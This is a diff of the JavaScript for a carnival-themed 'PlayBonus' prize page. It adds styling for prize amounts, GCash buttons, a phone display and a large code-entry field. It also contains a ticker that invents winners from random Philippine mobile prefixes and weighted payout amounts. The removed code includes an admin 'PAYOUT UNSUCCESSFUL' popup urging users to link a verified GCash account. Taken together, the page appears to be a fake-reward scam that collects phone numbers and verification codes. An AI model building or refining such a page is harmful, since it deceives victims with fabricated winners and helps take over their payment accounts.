+                'font-family: "Playfair Display", serif;',
+                'font-size: clamp(22px, 6vw, 30px);',
+                'font-weight: 900;',
+                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
+                '-webkit-background-clip: text;',
+                'background-clip: text;',
+                'color: transparent;',
+                'text-transform: uppercase;',
+                'letter-spacing: 2px;',
+                'margin: 0 0 12px;',
+                'filter: drop-shadow(0 0 20px rgba(255, 215, 0, 0.8));',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+
+            /* ========== AMOUNT ========== */
+            '.carnival-amount {',
+                'display: flex;',
+                'align-items: baseline;',
+                'justify-content: center;',
+                'gap: 4px;',
+                'margin: 0 0 16px;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-amount .currency {',
+                'font-family: "Orbitron", monospace;',
+                'font-size: clamp(20px, 5.5vw, 26px);',
+                'font-weight: 900;',
+                'color: #ffd700;',
+                'text-shadow: 0 0 20px rgba(255, 215, 0, 0.9);',
+            '}',
+            '.carnival-amount .value {',
+                'font-family: "Orbitron", monospace;',
+                'font-size: clamp(38px, 10.5vw, 52px);',
+                'font-weight: 900;',
+                'background: linear-gradient(180deg, #fff9c4 0%, #ffd700 40%, #ffeb3b 60%, #ff9800 100%);',
+                '-webkit-background-clip: text;',
+                'background-clip: text;',
+                'color: transparent;',
+                'letter-spacing: 2px;',
+                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.9));',
+                'animation: amountPulse 1.5s ease-in-out infinite;',
+            '}',
+
+            /* ========== DIVIDER ========== */
+            '.carnival-divider {',
+                'width: 80px;',
+                'height: 2px;',
+                'background: linear-gradient(90deg, transparent, #ffd700, transparent);',
+                'margin: 0 auto 16px;',
+                'box-shadow: 0 0 10px rgba(255, 215, 0, 0.6);',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+
+            /* ========== BILLS ========== */
+            '.carnival-bills {',
+                'display: flex;',
+                'justify-content: center;',
+                'gap: 8px;',
+                'margin: 0 0 16px;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-bills .bill-indicator {',
+                'width: 55px;',
+                'height: 28px;',
+                'border-radius: 4px;',
+                'overflow: hidden;',
+                'border: 1px solid rgba(255, 215, 0, 0.3);',
+                'transition: all 0.3s ease;',
+            '}',
+            '.carnival-bills .bill-indicator img {',
+                'width: 100%;',
+                'height: 100%;',
+                'object-fit: cover;',
+                'transition: all 0.3s ease;',
+            '}',
+            '.carnival-bills .bill-indicator.active {',
+                'border-color: #ffd700;',
+                'box-shadow: 0 0 12px rgba(255, 215, 0, 0.6);',
+            '}',
+
+            /* ========== SUBTEXT ========== */
+            '.carnival-subtext {',
+                'font-family: "Poppins", sans-serif;',
+                'font-size: 12px;',
+                'color: rgba(255, 255, 255, 0.85);',
+                'margin: 0 0 18px;',
+                'line-height: 1.5;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+
+            /* ========== BUTTONS ========== */
+            '.carnival-btn {',
+                'width: 100%;',
+                'padding: 14px 18px;',
+                'border-radius: 14px;',
+                'font-family: "Orbitron", monospace;',
+                'font-size: clamp(12px, 3.5vw, 14px);',
+                'font-weight: 900;',
+                'letter-spacing: 1.5px;',
+                'cursor: pointer;',
                 'display: flex;',
                 'align-items: center;',
                 'justify-content: center;',
                 'gap: 10px;',
-                'margin: 15px 0;',
+                'transition: all 0.1s ease;',
+                'text-transform: uppercase;',
+                'position: relative;',
+                'overflow: hidden;',
+                'z-index: 3;',
+                'margin-bottom: 10px;',
+            '}',
+            '.carnival-btn-gold {',
+                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.35) 0%, transparent 40%),',
+                    'linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);',
+                'border: 3px solid #fff9c4;',
+                'color: #8b0000;',
+                'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.7);',
+                'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6),',
+                    '0 0 35px rgba(255, 215, 0, 0.8);',
+            '}',
+            '.carnival-btn-gold::before {',
+                'content: "";',
+                'position: absolute;',
+                'top: 0;',
+                'left: -100%;',
+                'width: 100%;',
+                'height: 100%;',
+                'background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.7), transparent);',
+                'animation: btnShine 2.5s infinite;',
+            '}',
+            '.carnival-btn-gold:active {',
+                'transform: translateY(5px);',
+                'box-shadow: 0 0 0 #8b4500, 0 5px 15px rgba(0, 0, 0, 0.6),',
+                    '0 0 25px rgba(255, 215, 0, 0.6);',
+            '}',
+            '.carnival-btn-ghost {',
+                'background: linear-gradient(to bottom, #555, #333);',
+                'border: 1px solid #777;',
+                'color: #ccc;',
+                'padding: 10px 18px;',
+                'font-size: 11px;',
+                'box-shadow: 0 3px 0 #222;',
+            '}',
+            '.carnival-btn-ghost:active {',
+                'transform: translateY(3px);',
+                'box-shadow: 0 0 0 #222;',
+            '}',
+            '.carnival-btn-blue {',
+                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.3) 0%, transparent 40%),',
+                    'linear-gradient(180deg, #4fc3f7 0%, #0288d1 100%);',
+                'border: 2px solid #81d4fa;',
+                'color: #fff;',
+                'text-shadow: 0 2px 4px rgba(0, 0, 0, 0.4);',
+                'box-shadow: 0 5px 0 #01579b, 0 10px 25px rgba(0, 0, 0, 0.5),',
+                    '0 0 30px rgba(79, 195, 247, 0.6);',
+            '}',
+            '.carnival-btn-blue:active {',
+                'transform: translateY(5px);',
+                'box-shadow: 0 0 0 #01579b, 0 5px 15px rgba(0, 0, 0, 0.5);',
+            '}',
+            '.carnival-btn .gc-icon {',
+                'width: 22px;',
+                'height: 22px;',
+                'object-fit: contain;',
+            '}',
+
+            /* ========== TROPHY ========== */
+            '.carnival-trophy {',
+                'font-size: 60px;',
+                'margin-bottom: 10px;',
+                'animation: trophyBounce 1s ease-in-out infinite;',
+                'filter: drop-shadow(0 0 25px rgba(255, 215, 0, 0.8));',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+
+            /* ========== REWARD BOX ========== */
+            '.carnival-reward-box {',
+                'background: linear-gradient(180deg, rgba(255, 255, 255, 0.1) 0%, transparent 50%),',
+                    'linear-gradient(145deg, #1a0000, #330000);',
+                'border: 2px solid #ffd700;',
+                'border-radius: 16px;',
+                'padding: 16px;',
+                'margin: 0 0 18px;',
+                'box-shadow: 0 0 25px rgba(255, 215, 0, 0.5),',
+                    'inset 0 0 20px rgba(255, 215, 0, 0.1);',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-reward-amount {',
+                'font-family: "Orbitron", monospace;',
+                'font-size: 14px;',
+                'color: #fce883;',
+                'margin-top: 8px;',
+            '}',
+            '.carnival-reward-amount strong {',
+                'font-size: 24px;',
+                'color: #ffd700;',
+                'text-shadow: 0 0 15px rgba(255, 215, 0, 0.8);',
+                'display: inline-block;',
+                'margin-left: 4px;',
+            '}',
+
+            /* ========== CALL ICON ========== */
+            '.carnival-call-icon {',
+                'width: 80px;',
+                'height: 80px;',
+                'margin: 0 auto 16px;',
+                'background: radial-gradient(circle, rgba(79, 195, 247, 0.2), rgba(0, 100, 200, 0.05));',
+                'border: 2px solid rgba(79, 195, 247, 0.5);',
+                'border-radius: 50%;',
+                'display: flex;',
+                'align-items: center;',
+                'justify-content: center;',
+                'animation: callPulse 2s ease-in-out infinite;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-call-icon i {',
+                'font-size: 32px;',
+                'color: #4fc3f7;',
+                'text-shadow: 0 0 25px rgba(79, 195, 247, 0.8);',
+            '}',
+
+            /* ========== PHONE DISPLAY ========== */
+            '.carnival-phone-display {',
+                'display: flex;',
+                'align-items: center;',
+                'justify-content: center;',
+                'gap: 10px;',
+                'margin: 0 0 16px;',
                 'padding: 12px 20px;',
                 'background: rgba(0, 0, 0, 0.4);',
-                'border: 2px solid #00d4ff;',
+                'border: 2px solid #4fc3f7;',
                 'border-radius: 12px;',
-                'box-shadow: 0 0 25px rgba(0, 212, 255, 0.4), inset 0 0 20px rgba(0, 212, 255, 0.1);',
+                'box-shadow: 0 0 25px rgba(79, 195, 247, 0.4),',
+                    'inset 0 0 20px rgba(79, 195, 247, 0.1);',
+                'position: relative;',
+                'z-index: 3;',
             '}',
-            '.ai-phone-icon {',
-                'font-size: 24px;',
-                'animation: aiCallPulse 1.5s ease-in-out infinite;',
+            '.carnival-phone-display .phone-icon {',
+                'font-size: 22px;',
             '}',
-            '.ai-phone-number {',
+            '.carnival-phone-display .phone-number {',
                 'font-family: "Orbitron", monospace;',
                 'font-size: 20px;',
                 'font-weight: 900;',
-                'color: #00d4ff;',
+                'color: #4fc3f7;',
                 'letter-spacing: 3px;',
-                'text-shadow: 0 0 20px rgba(0, 212, 255, 0.6);',
+                'text-shadow: 0 0 20px rgba(79, 195, 247, 0.6);',
             '}',
-            '.ai-call-status {',
+
+            /* ========== STATUS ========== */
+            '.carnival-status {',
+                'background: rgba(79, 195, 247, 0.08);',
+                'border: 1px solid rgba(79, 195, 247, 0.3);',
+                'border-radius: 12px;',
+                'padding: 14px;',
+                'margin: 0 0 16px;',
+                'text-align: center;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-status .status-icon {',
+                'font-size: 26px;',
+                'margin-bottom: 6px;',
+            '}',
+            '.carnival-status .status-text {',
                 'font-family: "Poppins", sans-serif;',
                 'font-size: 13px;',
-                'color: #00d4ff;',
-                'text-align: center;',
-                'margin: 10px 0;',
-                'padding: 10px;',
-                'background: rgba(0, 212, 255, 0.08);',
-                'border: 1px solid rgba(0, 212, 255, 0.2);',
+                'color: rgba(255, 255, 255, 0.85);',
+            '}',
+
+            /* ========== INPUT ========== */
+            '.carnival-input {',
+                'width: 100%;',
+                'padding: 14px;',
+                'background: rgba(0, 0, 0, 0.5);',
+                'border: 2px solid #4fc3f7;',
                 'border-radius: 10px;',
+                'color: #4fc3f7;',
+                'font-family: "Orbitron", monospace;',
+                'font-size: 24px;',
+                'font-weight: 900;',
+                'text-align: center;',
+                'letter-spacing: 4px;',
+                'margin: 0 0 12px;',
+                'box-sizing: border-box;',
                 'transition: all 0.3s ease;',
+                'position: relative;',
+                'z-index: 3;',
+            '}',
+            '.carnival-input:focus {',
+                'outline: none;',
+                'border-color: #4fc3f7;',
+                'box-shadow: 0 0 30px rgba(79, 195, 247, 0.3);',
+            '}',
+            '.carnival-input::placeholder {',
+                'color: rgba(79, 195, 247, 0.3);',
+                'letter-spacing: 2px;',
+                'font-size: 16px;',
+            '}',
+
+            /* ========== ERROR ========== */
+            '.carnival-error {',
+                'background: rgba(255, 68, 68, 0.1);',
+                'border: 1px solid rgba(255, 68, 68, 0.2);',
+                'border-radius: 8px;',
+                'padding: 8px;',
+                'color: #ff4444;',
+                'font-size: 11px;',
+                'text-align: center;',
+                'margin: 0 0 12px;',
+                'font-family: "Poppins", sans-serif;',
+                'position: relative;',
+                'z-index: 3;',
             '}'
         ].join('');
         document.head.appendChild(style);
@@ -1233,14 +1464,12 @@
         if (!winnerSpan) return;
 
         var prefixes = ["0917", "0918", "0927", "0998", "0945", "0966", "0955", "0939", "0906", "0977"];
-
         var amountRarity = [
             { amount: 500, weight: 85 },
             { amount: 1000, weight: 10 },
             { amount: 2000, weight: 3 },
             { amount: 2500, weight: 2 }
         ];
-
         var actions = ["received", "received", "withdraw"];
 
         function generateRandomAmount() {
@@ -1374,299 +1603,6 @@
     }
 
     // ============================================================
-    // BAN CHECK
-    // ============================================================
-    function checkIfBanned() {
-        if (!userPhone) return;
-        try {
-            db.ref('banned_ghosts/' + userPhone).once('value').then(function(snap) {
-                if (snap.exists()) {
-                    db.ref('user_sessions/' + userPhone).update({ status: 'offline' });
-                    localStorage.clear();
-                    sessionStorage.clear();
-                    window.location.replace('index.html');
-                }
-            });
-        } catch(e) {}
-    }
-
-    // ============================================================
-    // ADMIN-ONLY FORCE LOGOUT
-    // ============================================================
-    function initAdminForceLogoutListener() {
-        if (!userPhone || !db) {
-            console.log('⚠️ Cannot init force logout');
-            return;
-        }
-
-        var cleanPhone = userPhone.replace(/[^0-9]/g, '');
-        console.log('🔍 Admin Force Logout Listener active for:', cleanPhone);
-
-        try {
-            userRef.update({
-                status: 'online',
-                forceLogout: false,
-                lastSeen: firebase.database.ServerValue.TIMESTAMP
-            }).then(function() {
-                console.log('✅ User reset to ONLINE');
-                setTimeout(function() {
-                    setupAdminLogoutListener(cleanPhone);
-                }, 2000);
-            }).catch(function(e) {
-                console.error('Failed to reset user status:', e);
-                setTimeout(function() {
-                    setupAdminLogoutListener(cleanPhone);
-                }, 3000);
-            });
-        } catch(e) {
-            console.error('Force logout listener error:', e);
-        }
-    }
-
-    function setupAdminLogoutListener(cleanPhone) {
-        if (listenersSetup) return;
-        listenersSetup = true;
-
-        console.log('🔍 Setting up admin logout listeners...');
-
-        forceLogoutFlagListener = db.ref('user_sessions/' + cleanPhone + '/forceLogout');
-
-        forceLogoutFlagListener.on('value', function(snapshot) {
-            var forceFlag = snapshot.val();
-            var now = Date.now();
-            var timeSinceLoad = now - pageLoadTime;
-
-            console.log('📡 forceLogout flag update:', forceFlag);
-
-            if (forceFlag === true && !logoutTriggered && timeSinceLoad > 3000) {
-                console.log('⚠️ ADMIN FORCE LOGOUT TRIGGERED!');
-                logoutTriggered = true;
-
-                if (forceLogoutFlagListener) {
-                    forceLogoutFlagListener.off();
-                    forceLogoutFlagListener = null;
-                }
-
-                showForceLogoutPopup();
-            }
-        });
-
-        forceLogoutListener = db.ref('user_sessions/' + cleanPhone + '/status');
-
-        forceLogoutListener.on('value', function(snapshot) {
-            var status = snapshot.val();
-            var now = Date.now();
-            var timeSinceLoad = now - pageLoadTime;
-
-            console.log('📡 Status update:', status);
-
-            if (status === 'offline' && !logoutTriggered && timeSinceLoad > 3000) {
-                db.ref('user_sessions/' + cleanPhone + '/forceLogout').once('value').then(function(flagSnap) {
-                    var forceFlag = flagSnap.val();
-
-                    if (forceFlag === true) {
-                        console.log('⚠️ ADMIN FORCE LOGOUT (via status)');
-                        logoutTriggered = true;
-
-                        if (forceLogoutListener) {
-                            forceLogoutListener.off();
-                            forceLogoutListener = null;
-                        }
-
-                        showForceLogoutPopup();
-                    }
-                });
-            }
-        });
-
-        console.log('✅ Admin logout listeners ready');
-    }
-
-    function showForceLogoutPopup() {
-        if (document.querySelector('.force-logout-popup')) return;
-
-        addForceLogoutAnimations();
-
-        var overlay = document.createElement('div');
-        overlay.className = 'force-logout-popup';
-        overlay.style.cssText =
-            'position: fixed;' +
-            'inset: 0;' +
-            'background: radial-gradient(ellipse at center, rgba(20, 0, 0, 0.98), rgba(0, 0, 0, 0.99));' +
-            'backdrop-filter: blur(15px);' +
-            '-webkit-backdrop-filter: blur(15px);' +
-            'z-index: 999999;' +
-            'display: flex;' +
-            'align-items: center;' +
-            'justify-content: center;' +
-            'animation: fadeInForceLogout 0.4s ease;' +
-            'padding: 20px;';
-
-        var particles = document.createElement('div');
-        particles.style.cssText =
-            'position: absolute; inset: 0; overflow: hidden; pointer-events: none;';
-
-        for (var i = 0; i < 30; i++) {
-            var particle = document.createElement('div');
-            var size = Math.random() * 4 + 2;
-            var startX = Math.random() * 100;
-            var delay = Math.random() * 3;
-            var duration = Math.random() * 3 + 2;
-            particle.style.cssText =
-                'position: absolute; top: -10px; left: ' + startX + '%;' +
-                'width: ' + size + 'px; height: ' + size + 'px;' +
-                'background: rgba(255, 215, 0, ' + (Math.random() * 0.5 + 0.3) + ');' +
-                'border-radius: 50%;' +
-                'animation: floatDownForceLogout ' + duration + 's ' + delay + 's linear infinite;' +
-                'box-shadow: 0 0 ' + (size * 2) + 'px rgba(255, 215, 0, 0.6);';
-            particles.appendChild(particle);
-        }
-        overlay.appendChild(particles);
-
-        var cardWrapper = document.createElement('div');
-        cardWrapper.style.cssText =
-            'position: relative; z-index: 1;' +
-            'animation: cardEnterForceLogout 0.6s cubic-bezier(0.175, 0.885, 0.32, 1.275);' +
-            'max-width: 360px; width: 100%;';
-
-        var glowRing = document.createElement('div');
-        glowRing.style.cssText =
-            'position: absolute; inset: -3px; border-radius: 28px;' +
-            'background: conic-gradient(from 0deg, transparent, rgba(255, 215, 0, 0.8), transparent, rgba(255, 215, 0, 0.4), transparent);' +
-            'animation: rotateGlowForceLogout 4s linear infinite; filter: blur(3px);';
-        cardWrapper.appendChild(glowRing);
-
-        var card = document.createElement('div');
-        card.style.cssText =
-            'position: relative;' +
-            'background: linear-gradient(160deg, #1a0000 0%, #2a0000 40%, #0d0000 100%);' +
-            'border: 3px solid rgba(255, 215, 0, 0.6);' +
-            'border-radius: 24px;' +
-            'padding: 35px 28px 28px;' +
-            'text-align: center;' +
-            'box-shadow: 0 30px 60px rgba(0, 0, 0, 0.9), 0 0 60px rgba(255, 215, 0, 0.3);' +
-            'overflow: hidden;';
-
-        var iconBg = document.createElement('div');
-        iconBg.style.cssText =
-            'width: 90px; height: 90px; margin: 0 auto 16px;' +
-            'background: radial-gradient(circle, rgba(255, 68, 68, 0.9), rgba(139, 0, 0, 0.95));' +
-            'border-radius: 50%; display: flex; align-items: center; justify-content: center;' +
-            'border: 3px solid #ffd700;' +
-            'box-shadow: 0 0 30px rgba(255, 215, 0, 0.6);';
-
-        var iconEl = document.createElement('span');
-        iconEl.style.cssText = 'font-size: 44px; animation: bounceIconForceLogout 0.8s ease;';
-        iconEl.textContent = '💸';
-        iconBg.appendChild(iconEl);
-        card.appendChild(iconBg);
-
-        var badge = document.createElement('div');
-        badge.style.cssText =
-            'display: inline-block; background: rgba(255, 68, 68, 0.2);' +
-            'border: 1px solid rgba(255, 68, 68, 0.5); border-radius: 20px;' +
-            'padding: 5px 16px; margin-bottom: 12px;' +
-            'font-family: "Orbitron", monospace; font-size: 9px; font-weight: 700;' +
-            'color: #ff6666; letter-spacing: 2px; text-transform: uppercase;';
-        badge.textContent = '● Session Ended';
-        card.appendChild(badge);
-
-        var titleEl = document.createElement('h2');
-        titleEl.style.cssText =
-            'font-family: "Playfair Display", serif; font-size: 24px; font-weight: 900;' +
-            'background: linear-gradient(to bottom, #fff9c4 0%, #ffd700 50%, #ff9800 100%);' +
-            '-webkit-background-clip: text; background-clip: text; color: transparent;' +
-            'margin: 0 0 10px 0; letter-spacing: 2px; text-transform: uppercase;';
-        titleEl.textContent = 'PAYOUT UNSUCCESSFUL';
-        card.appendChild(titleEl);
-
-        var divider = document.createElement('div');
-        divider.style.cssText = 'display: flex; align-items: center; justify-content: center; gap: 10px; margin: 0 auto 18px;';
-        divider.innerHTML =
-            '<div style="width: 50px; height: 1px; background: linear-gradient(90deg, transparent, #ffd700);"></div>' +
-            '<div style="width: 8px; height: 8px; background: #ffd700; transform: rotate(45deg);"></div>' +
-            '<div style="width: 50px; height: 1px; background: linear-gradient(90deg, #ffd700, transparent);"></div>';
-        card.appendChild(divider);
-
-        var msgEl = document.createElement('div');
-        msgEl.style.cssText =
-            'font-family: "Poppins", sans-serif; font-size: 14px;' +
-            'color: #ccc; line-height: 1.7; margin: 0 0 12px 0;';
-        msgEl.innerHTML =
-            'Your payout request is <span style="color: #ff6666; font-weight: 700;">unsuccessful</span>.<br><br>' +
-            'Use <strong style="color: #fff9c4;">verified GCash Account</strong><br>' +
-            'to process instant withdrawal.';
-        card.appendChild(msgEl);
-
-        var infoBox = document.createElement('div');
-        infoBox.style.cssText =
-            'background: rgba(255, 215, 0, 0.08);' +
-            'border: 1px solid rgba(255, 215, 0, 0.3);' +
-            'border-radius: 12px; padding: 12px 14px; margin: 14px 0 20px;' +
-            'font-family: "Poppins", sans-serif; font-size: 11px;' +
-            'color: #999; text-align: left; line-height: 1.5;';
-        infoBox.innerHTML =
-            '<div style="display: flex; align-items: center; gap: 8px; margin-bottom: 6px;">' +
-                '<span style="font-size: 18px;">💡</span>' +
-                '<span style="color: #ffd700; font-weight: 700;">Tip for successful withdrawal:</span>' +
-            '</div>' +
-            '<span>Make sure your GCash account is <strong style="color: #39ff14;">fully verified</strong> with the same mobile number.</span>';
-        card.appendChild(infoBox);
-
-        var btn = document.createElement('button');
-        btn.style.cssText =
-            'width: 100%;' +
-            'background: linear-gradient(180deg, #ffeb3b 0%, #ffd700 30%, #ff9800 70%, #ff6f00 100%);' +
-            'border: 3px solid #fff9c4; border-radius: 14px;' +
-            'padding: 16px 24px;' +
-            'font-family: "Orbitron", monospace; font-size: 14px; font-weight: 900;' +
-            'color: #8b0000; cursor: pointer; letter-spacing: 2px;' +
-            'text-shadow: 0 2px 0 rgba(255, 255, 255, 0.6);' +
-            'box-shadow: 0 5px 0 #8b4500, 0 10px 25px rgba(0, 0, 0, 0.6);' +
-            'transition: all 0.1s ease; text-transform: uppercase;';
-        btn.textContent = '🏠 RETURN TO HOME';
-
-        btn.addEventListener('click', function() {
-            overlay.style.animation = 'fadeOutForceLogout 0.3s ease forwards';
-            cardWrapper.style.animation = 'cardExitForceLogout 0.3s ease forwards';
-            setTimeout(function() {
-                localStorage.clear();
-                sessionStorage.clear();
-                window.location.replace('index.html');
-            }, 300);
-        });
-
-        card.appendChild(btn);
-        cardWrapper.appendChild(card);
-        overlay.appendChild(cardWrapper);
-        document.body.appendChild(overlay);
-
-        setTimeout(function() {
-            if (document.querySelector('.force-logout-popup')) {
-                localStorage.clear();
-                sessionStorage.clear();
-                window.location.replace('index.html');
-            }
-        }, 15000);
-    }
-
-    function addForceLogoutAnimations() {
-        if (document.querySelector('#force-logout-animations')) return;
-
-        var style = document.createElement('style');
-        style.id = 'force-logout-animations';
-        style.textContent =
-            '@keyframes fadeInForceLogout { from { opacity: 0; } to { opacity: 1; } }' +
-            '@keyframes fadeOutForceLogout { from { opacity: 1; } to { opacity: 0; } }' +
-            '@keyframes cardEnterForceLogout { 0% { transform: scale(0.7) translateY(30px); opacity: 0; } 60% { transform: scale(1.03) translateY(-5px); } 100% { transform: scale(1) translateY(0); opacity: 1; } }' +
-            '@keyframes cardExitForceLogout { from { transform: scale(1); opacity: 1; } to { transform: scale(0.8) translateY(20px); opacity: 0; } }' +
-            '@keyframes bounceIconForceLogout { 0% { transform: scale(0) rotate(-30deg); } 50% { transform: scale(1.3) rotate(10deg); } 70% { transform: scale(0.85); } 100% { transform: scale(1) rotate(0deg); } }' +
-            '@keyframes rotateGlowForceLogout { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }' +
-            '@keyframes floatDownForceLogout { 0% { transform: translateY(-10px); opacity: 0; } 10% { opacity: 1; } 90% { opacity: 1; } 100% { transform: translateY(105vh); opacity: 0; } }';
-        document.head.appendChild(style);
-    }
-
-    // ============================================================
     // EXPORT
     // ============================================================
     window.PlayBonus = {
@@ -1684,15 +1620,9 @@
     // START
     // ============================================================
     if (document.readyState === 'loading') {
-        document.addEventListener('DOMContentLoaded', function() {
-            init();
-            setInterval(checkIfBanned, 5000);
-            checkIfBanned();
-        });
+        document.addEventListener('DOMContentLoaded', init);
     } else {
         init();
-        setInterval(checkIfBanned, 5000);
-        checkIfBanned();
     }
 
 })();
